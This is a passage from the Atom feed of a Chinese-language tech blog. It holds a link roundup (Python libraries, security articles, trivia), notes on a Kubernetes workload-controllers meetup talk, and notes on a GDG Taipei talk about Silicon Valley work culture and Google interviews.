&lt;li&gt;D - Dependency Inversion Principle  &lt;ul&gt;
&lt;li&gt;Entities must depend on abstractions not on concretions. It states that the high level module must not depend on the low level module, but they should depend on abstractions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/08/01/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-06-concurrent-futures/"&gt;concurrent.futures — 創立非同步任務 — 你所不知道的 Python 標準函式庫用法 06 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還真沒印象有看過這個 lib 感覺比用 multiprocessing 或 threading 還好寫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/07/28/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-03-abc/"&gt;abc — 抽象類別 — 你所不知道的 Python 標準函式庫用法 03 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是個有用過但一直沒有很懂的 Library 呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://logan.tw/posts/2016/01/02/python-new-style-class/"&gt;Python New Style Class | Logan's Note&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然有看過了 但再複習一次 Class 的繼承在 Python 2 和 3 之間的差別吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/07/27/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-02-random/"&gt;random — 你所不知道的 Python 標準函式庫用法 02 | louie_lu's blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html"&gt;Orange: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;竟然可以串到變 RCE 真精彩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hackaday.com/2017/07/30/find-instructions-hidden-in-your-cpu/"&gt;Find Instructions Hidden In Your CPU | Hackaday&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;There was a time when owning a computer meant you probably knew most or all of the instructions it could execute. Your modern PC, though, has a lot of instructions, many of them meant for specialized operating system, encryption, or digital signal processing features.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/xoreaxeaxeax/sandsifter"&gt;xoreaxeaxeax/sandsifter: The x86 processor fuzzer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The sandsifter audits x86 processors for hidden instructions and hardware bugs, by systematically generating machine code to search through a processor's instruction set, and monitoring execution for anomalies.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=E6BY7_Zpj0I&amp;amp;feature=youtu.be&amp;amp;t=1m21s"&gt;一青窈與平井堅XD - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;靠北 用 Audacity 試了一下發現這是真的說  &lt;/li&gt;
&lt;li&gt;一青窈的もらい泣き用改變音高的那種放慢 80% 就會變成平井堅的歌聲  &lt;/li&gt;
&lt;li&gt;以前聽這首歌完全不知道 太神奇了 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/07/working-poor.html"&gt;穷忙的人生 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真是貼切啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kocpc.com.tw/archives/157259"&gt;波音 787 超狂測試，一邊挑戰最長飛行距離一邊畫飛機 - 電腦王阿達&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作為客機製造公司，Boeing 波音可以說是這個領域的第一。最近該公司測試最新客機 波音 787 ，計畫要進行一場近18小時的長程飛行測試時，一般只要讓飛機在兩地之間來回繞行以達到里程，但該公司最後在美國領空，用飛行過  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cool3c.com/article/127439"&gt;史上最狂 AirDrop 飛行中的 747、777 機長對傳照片 #波音 (127439) - 癮科技&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;剛在Facebook粉絲專頁Jamaica Aviation Spotters貼出某位波音747-8型飛機的機長，碰到正在飛行的新加坡航空777型飛機，想傳圖片給對方機長，結果靠的竟然是iPhone的AirDrop，這大概是蘋果AirDrop的最好宣傳案例。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;youtube&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/LifeProTips/comments/247c2u/lpt_youtube_how_to_play_all_videos_from_a_channel/"&gt;LPT: Youtube: how to play all videos from a channel as a playlist : LifeProTips&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;隨便點一個影片在網址加上&lt;code&gt;&amp;amp;feature=mfu_in_order&amp;amp;list=UL&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="cli"></category><category term="ctf"></category><category term="defcon"></category><category term="gke"></category><category term="golang"></category><category term="k8s"></category><category term="life"></category><category term="misc"></category><category term="mysql"></category><category term="programmer"></category><category term="programming"></category><category term="python"></category><category term="security"></category><category term="trivia"></category><category term="youtube"></category></entry><entry><title>GCPUG.tw #28</title><link href="https://blog.m157q.tw/posts/2017/08/04/gcpug-tw-28/" rel="alternate"></link><published>2017-08-04T21:37:05+08:00</published><updated>2017-08-04T21:37:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-04:posts/2017/08/04/gcpug-tw-28/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gcpugtw.kktix.cc/events/meetup201708"&gt;https://gcpugtw.kktix.cc/events/meetup201708&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Running Workloads in Kubernetes - Janet Kuo&lt;/h1&gt;
&lt;p&gt;今年 2/28 時，&lt;a href="https://techcrunch.com/2017/02/28/amazon-aws-s3-outage-is-breaking-things-for-a-lot-of-websites-and-apps/"&gt;Amazon S3 的 outage&lt;/a&gt; 讓很多公司的網站都掛了，&lt;br /&gt;
但有間叫 &lt;a href="https://twitter.com/robertjscott/status/836743514423713793"&gt;Spire 的公司沒受到影響&lt;/a&gt;，&lt;br /&gt;
原因是因為用了 Kubernetes。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos"&gt;https://github.com/janetkuo/k8s-demos&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/contrib/tree/master/micro-demos"&gt;https://github.com/kubernetes/contrib/tree/master/micro-demos&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture of Kubernetes  &lt;ul&gt;
&lt;li&gt;Master node  &lt;ul&gt;
&lt;li&gt;Controller  &lt;ul&gt;
&lt;li&gt;管理 Worker nodes 上面的 Pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Worker node  &lt;ul&gt;
&lt;li&gt;Running Pods  &lt;/li&gt;
&lt;li&gt;Pull image  &lt;/li&gt;
&lt;li&gt;把 Network, Volume 連接起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Four General Patterns  &lt;ul&gt;
&lt;li&gt;Stateless  &lt;ul&gt;
&lt;li&gt;Web frontends  &lt;/li&gt;
&lt;li&gt;Web servers  &lt;ul&gt;
&lt;li&gt;NGINX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stateful  &lt;ul&gt;
&lt;li&gt;Databases  &lt;ul&gt;
&lt;li&gt;MongoDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Message queues  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Daemon  &lt;ul&gt;
&lt;li&gt;Cluster storage  &lt;/li&gt;
&lt;li&gt;Logs collections  &lt;/li&gt;
&lt;li&gt;Node monitoring  &lt;/li&gt;
&lt;li&gt;example  &lt;ul&gt;
&lt;li&gt;linkerd  &lt;/li&gt;
&lt;li&gt;fluentd  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Batch  &lt;ul&gt;
&lt;li&gt;Emails to send  &lt;/li&gt;
&lt;li&gt;Files to zip  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deployment (For stateless pattern)  &lt;ul&gt;
&lt;li&gt;No persistent states  &lt;ul&gt;
&lt;li&gt;Scale is easy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Availability &amp;gt; Consistency  &lt;ul&gt;
&lt;li&gt;Create multiple replicas of the smae pod  &lt;/li&gt;
&lt;li&gt;Pods are disposable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;Update at a controlled rate  &lt;/li&gt;
&lt;li&gt;Block updates on failure  &lt;/li&gt;
&lt;li&gt;History and rollback  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;kubectl&lt;/code&gt; 下指令，會對 Master node 下一個 async 的指令，Master Node 再透過 controller 去控制 Worker node  &lt;/li&gt;
&lt;li&gt;Service  &lt;ul&gt;
&lt;li&gt;去跟後面的 Pods 溝通  &lt;/li&gt;
&lt;li&gt;當有 Pod 掛掉的話，Service 的 load balancer 就不會把 request 導到壞掉的 Pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/dep"&gt;https://github.com/janetkuo/k8s-demos/tree/master/dep&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;StatefulSet (For stateful pattern, 另外一個專門針對 Stateful 使用的 controller)  &lt;ul&gt;
&lt;li&gt;可能的使用情境  &lt;ul&gt;
&lt;li&gt;ZooKeeper  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Store persistent data  &lt;ul&gt;
&lt;li&gt;Need stable, unique and sticky identity and storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistency &amp;gt; Availability  &lt;ul&gt;
&lt;li&gt;Create similar pods, each has its own identity and storage  &lt;/li&gt;
&lt;li&gt;Pods are not disposable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deploy, scale, terminate  &lt;ul&gt;
&lt;li&gt;In order or in parallel  &lt;/li&gt;
&lt;li&gt;可以設定依序 deploy，因為有些服務不能全部一起開，而是必須照順序開。但如果沒有這個需求的話，還是可以用 Parallel。  &lt;/li&gt;
&lt;li&gt;StatefulSet 的 Parallel Deployment 是在 k8s 1.7 加入的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;StatefulSet 的 parallel rolling update 是在 k8s 1.7 加入的功能  &lt;/li&gt;
&lt;li&gt;會有 graceful 的 termination，預設的 timeout 時間是 30 秒，如果超過的話，termination 就會被取消。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/stateful"&gt;https://github.com/janetkuo/k8s-demos/tree/master/stateful&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DaemonSet (For Daemon Pattern)  &lt;ul&gt;
&lt;li&gt;One Daemon per node  &lt;ul&gt;
&lt;li&gt;Background process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Daemons created and removed with nodes  &lt;/li&gt;
&lt;li&gt;Node labels  &lt;ul&gt;
&lt;li&gt;Control which nodes daemons should run on  &lt;/li&gt;
&lt;li&gt;可以用來控制讓 daemon 只執行在特定的 node 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;在 k8s 1.6 新增的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/ds"&gt;https://github.com/janetkuo/k8s-demos/tree/master/ds&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs (For Batch Pattern)  &lt;ul&gt;
&lt;li&gt;Run in Parallel  &lt;ul&gt;
&lt;li&gt;How many pods can be created and running at a time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run to Completion  &lt;ul&gt;
&lt;li&gt;How many pods need to complete (exit successfully)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Parallel processing of independent but related work items  &lt;ul&gt;
&lt;li&gt;Emails to send or frames to render  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job create 出來的 pod 是會結束的，因為事情做完了就會關掉。與前面 3 個 pattern 的 controller 建立的 Pod 不同，如果壞掉了不會幫你重開。  &lt;/li&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/jobs"&gt;https://github.com/janetkuo/k8s-demos/tree/master/jobs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;parallelism: 一次最多開幾個 pod  &lt;/li&gt;
&lt;li&gt;completions: 需要幾個成功的 pods 才能停止  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;4 Controllers for 4 Patterns  &lt;ul&gt;
&lt;li&gt;Deployment  &lt;ul&gt;
&lt;li&gt;Availability  &lt;/li&gt;
&lt;li&gt;Scale &amp;amp; recover easily  &lt;/li&gt;
&lt;li&gt;Disposable cpoies of the same pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;StatefulSet  &lt;ul&gt;
&lt;li&gt;Consistency  &lt;/li&gt;
&lt;li&gt;Unique, sticky identity and storage  &lt;/li&gt;
&lt;li&gt;Deploy, scale and terminate in order or in parallel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DaemonSet  &lt;ul&gt;
&lt;li&gt;One pod per node by default  &lt;/li&gt;
&lt;li&gt;Daemon pods added and removed with nodes  &lt;/li&gt;
&lt;li&gt;Use node labels to control  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs  &lt;ul&gt;
&lt;li&gt;Run multiple pods in parallel  &lt;/li&gt;
&lt;li&gt;Run pods to completion  &lt;ul&gt;
&lt;li&gt;只有指定數量的 pods 都成功結束的話，這個 job 才算成功  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Where Do I start?  &lt;ul&gt;
&lt;li&gt;Get a Kubernetes Cluster  &lt;ul&gt;
&lt;li&gt;GCE  &lt;/li&gt;
&lt;li&gt;GKE  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/minikube"&gt;minikube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/charts"&gt;Kubernetes Charts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Curated applications for Kubernetes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/helm"&gt;Kubernetes Helm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;The Kubernetes Package Manager  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How Do I Customize?  &lt;ul&gt;
&lt;li&gt;Kubernetes is extensible  &lt;ul&gt;
&lt;li&gt;You can write your own controller or use controllers wrote by other people.  &lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/upmc-enterprises/elasticsearch-operator"&gt;https://github.com/upmc-enterprises/elasticsearch-operator&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/coreos/etcd-operator"&gt;https://github.com/coreos/etcd-operator&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Kubernetes is Open  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io"&gt;https://kubernetes.io&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack.k8s.io"&gt;https://slack.k8s.io&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/kubernetesio"&gt;https://twitter.com/kubernetesio&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;StatefulSet 的 Storage 不會被砍掉，那 DaemonSet 可以有一樣的效果嗎？因為有時候一些 Daemon 會需要這方式。  &lt;ul&gt;
&lt;li&gt;可以，但只能讀，不能寫，因為 DaemonSet 的設計上的關係，如果大家都可以寫的話會很亂。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling Update 如果希望新舊版都同時存在的話該怎麼做  &lt;ul&gt;
&lt;li&gt;StatefulSet 可以透過 Partition 做到  &lt;/li&gt;
&lt;li&gt;Deployment 的話，可以建立一個新的和一個舊的 Deployment，再透過 Service 的 Load Balancer 去導流量。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling Update 如果不希望新舊版都同時存在的話該怎麼做  &lt;ul&gt;
&lt;li&gt;StatefulSet 沒辦法做到  &lt;/li&gt;
&lt;li&gt;但 Deployment 可以把 strategy 設定成 Recreate，這樣就會先起好新的 pod，然後把舊的砍掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>GDG Taipei #40</title><link href="https://blog.m157q.tw/posts/2017/08/02/gdg-taipei-40/" rel="alternate"></link><published>2017-08-02T19:40:45+08:00</published><updated>2017-08-02T19:40:45+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-02:posts/2017/08/02/gdg-taipei-40/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.meetup.com/GDGTaipei/events/241300863/"&gt;https://www.meetup.com/GDGTaipei/events/241300863/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Women Techmakers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.womentechmakers.com/"&gt;https://www.womentechmakers.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;First Asia Women Techmakers Lead  &lt;/li&gt;
&lt;li&gt;2012 年由 Google 創立  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;GDG Taipei #40 - Women Techmakers #3 Janet Kuo 郭家禎&lt;/h2&gt;
&lt;h3&gt;What I learned in Silicon Valley&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Silicon Valley is a mindset. Not visual or physical.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;矽谷的精神  &lt;ul&gt;
&lt;li&gt;It's Okay to FAIL.  &lt;ul&gt;
&lt;li&gt;It's okay to take risks.  &lt;/li&gt;
&lt;li&gt;上一次失敗是什麼時候？  &lt;/li&gt;
&lt;li&gt;如果想不起來，可能是你很幸運，但也非常有可能是因為你都待在舒適圈，一直打著安全牌，意味著同時也失去了不少可以成長的機會。  &lt;/li&gt;
&lt;li&gt;如果穩定是你的夢想的話，那恭喜你。但如果只是為了穩定而去做自己不想做的事，那就是放棄自己的夢想。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;當時放棄在台灣 IBM 的工作機會而選擇要到美國去的時候，也受到身邊很多人的反對。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;矽谷的公司很樂於冒險，即便是大公司，也會想盡辦法追求各種新的可能性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Postmortem Culture  &lt;ul&gt;
&lt;li&gt;發生重大事故之後的檢討，從失敗中學習。  &lt;/li&gt;
&lt;li&gt;No blame culture. 對事不對人。  &lt;ul&gt;
&lt;li&gt;以今年初 GitLab 員工誤刪資料庫且備份無法還原為例，GitLab 沒有開除該名員工，然後把所有救援的細節都公開並甚至開直播告知使用者目前救援的進度。許多矽谷的公司也因為這件事而開始重視檢測資料庫備份是否能夠順利還原的機制。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Take Personal Responsibility for your work.  &lt;ul&gt;
&lt;li&gt;Have an opinion  &lt;ul&gt;
&lt;li&gt;不要因為自己的年資比較淺就覺得不能有自己的意見，永遠要有自己的想法。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一位去 Facebook 面試的朋友，遇到面試官問他如果要在 Facebook 上設計出可以標記物品的品牌價錢的功能要怎麼設計。結果朋友告訴面試官他覺得這個功能不適合 Facebook，因為 Facebook 重視的是人與人之間的互動，而不是物品，所以他拒絕設計這個功能。最後的結果是這位朋友拿到了 Facebook 的 Offer。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Have an impact  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;"Failure is an option here. If things are not failing, you are not innovating enough." -- Elon Musk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;怎麼進 Google  &lt;ul&gt;
&lt;li&gt;Software Engineer 面試流程  &lt;ul&gt;
&lt;li&gt;Whiteboard  &lt;ul&gt;
&lt;li&gt;基本的演算法和資料結構  &lt;/li&gt;
&lt;li&gt;多練習在白板上寫，跟用電腦寫差很多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果有工作經驗的話，會問 System Design。這邊就比較吃實戰經驗，也可以多看一些公司的 Engineering Blog。  &lt;/li&gt;
&lt;li&gt;履歷一放上去後，很多公司都會找上來，不管哪間的面試都去，把他當成免費的經驗。  &lt;/li&gt;
&lt;li&gt;因為留學生有找工作的時程壓力，所以策略是一批公司一批公司面試，這批如果都沒結果的話就換下一批。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼選 Google  &lt;ul&gt;
&lt;li&gt;原本比較想去的是 Medium，但後來考量到簽證和工作內容的自由度還是選擇去 Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Google 遭遇最大的困難和挫折是什麼？怎麼面對的？  &lt;ul&gt;
&lt;li&gt;周圍的人都很強，冒牌者症後群。  &lt;/li&gt;
&lt;li&gt;剛進去的時候人資就直接說：「剛進來的你們一定都會以為自己是不小心被 hire 進來的，這是很正常的，不要怕。」  &lt;/li&gt;
&lt;li&gt;英文溝通不那麼流暢，剛好 Google 有給進修費，所以就順便去找英文老師上課。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Google 工作期間最有成就最開心的事  &lt;ul&gt;
&lt;li&gt;最有成就感的是看到使用者用了並且很喜歡自己做的功能  &lt;ul&gt;
&lt;li&gt;有幫忙 Support Pokemon Go 的 Team  &lt;/li&gt;
&lt;li&gt;能講 Pokemon Go 是跑在自己做的產品上的時候很開心  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;英文溝通上的困難怎麼解決的  &lt;ul&gt;
&lt;li&gt;最難的不是技術相關的話題，而是 Small Talk  &lt;/li&gt;
&lt;li&gt;可以觀察對話中誰是引領話題的人，可以嘗試跟他對話把話題轉掉之類的 XD  &lt;/li&gt;
&lt;li&gt;Ice Breaker 式的問答，大部份都是先握個手再自我介紹然後找了一些共同點來聊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在矽谷，男生和女生的 Leader 有什麼不一樣的地方  &lt;ul&gt;
&lt;li&gt;領導方式都不一樣，但跟性別沒有什麼大太的相關性。  &lt;/li&gt;
&lt;li&gt;有的話很多，喜歡講笑話。有的很溫文儒雅，會有耐心解釋跟你一些東西。  &lt;/li&gt;
&lt;li&gt;同樣的話題，如果是女生講的話大家普遍都不太在意，但如果是男生來講的話，大家就會覺得不錯。但就是要一直講一直講，捍衛自己的意見。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tech Lead 是什麼？  &lt;ul&gt;
&lt;li&gt;不負責帶人，但負責整個團隊的技術走向。  &lt;/li&gt;
&lt;li&gt;告知團隊整個 Project 的 Roadmap 和 Schedule  &lt;/li&gt;
&lt;li&gt;團隊裡負責做技術決定的，不管人，如果你今天心情不好，去跟老闆說 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你在 Kubernetes 裏面負責什麼部份？  &lt;ul&gt;
&lt;li&gt;API 和 Storage 相關 Workload 的 Support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你在 IBM Taiwan 和 Google 裏面感受到的差異  &lt;ul&gt;
&lt;li&gt;在台灣聽到 IBM，大家覺得好厲害，外商耶。在美國，聽到的人會說，「哈，你老人嗎」 XD  &lt;/li&gt;
&lt;li&gt;IBM 算是間歷史比較悠久一點的公司，近期以來比較沒有什麼創新的部份。  &lt;/li&gt;
&lt;li&gt;Google 雖然也是大公司，但還是會花錢做一些不一定用得到但是創新的技術。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對自己未來 5 年的規劃是什麼？你還會待在大公司嗎？還是會想要加入自己本來想要的新創公司  &lt;ul&gt;
&lt;li&gt;變動很快，很難說。自己剛出來工作的時候大家都搶著進 Dropbox，但現在也沒這麼紅了。  &lt;/li&gt;
&lt;li&gt;不會說 5 年後一定要待在 Google，原本不是這樣想，但來了矽谷以後，感覺到如果自己想永遠待在某間公司的想法是很危險的，永遠要為自己的下一份工作著想。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
